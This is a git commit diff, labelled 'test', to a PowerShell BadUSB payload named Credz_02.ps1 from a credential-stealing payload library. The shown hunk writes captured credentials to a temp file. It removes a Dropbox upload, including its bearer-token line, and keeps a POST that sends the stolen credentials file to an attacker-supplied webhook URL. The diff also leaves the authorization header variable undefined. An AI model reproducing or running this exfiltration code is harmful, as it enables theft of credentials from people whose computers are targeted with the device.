7cf8e409354e6be36006c34f34615f3d87697f09
br-not <b_linhares@outlook.com>
2025-10-09 14:07:44 -0300

    test

--- BadUSB/Payloads/library/credentials/-RD-Credz-Plz/Credz_02.ps1
+++ BadUSB/Payloads/library/credentials/-RD-Credz-Plz/Credz_02.ps1
@@ -105,12 +105,10 @@ echo $creds >> $env:TMP\$FileName
 $TargetFilePath="/$FileName"
 $SourceFilePath="$env:TMP\$FileName"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $DropBoxAccessToken
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 Invoke-RestMethod -Uri $WebhookUrl -Method Post -InFile $SourceFilePath -Headers $headers
 
 #------------------------------------------------------------------------------------------------------------------------------------
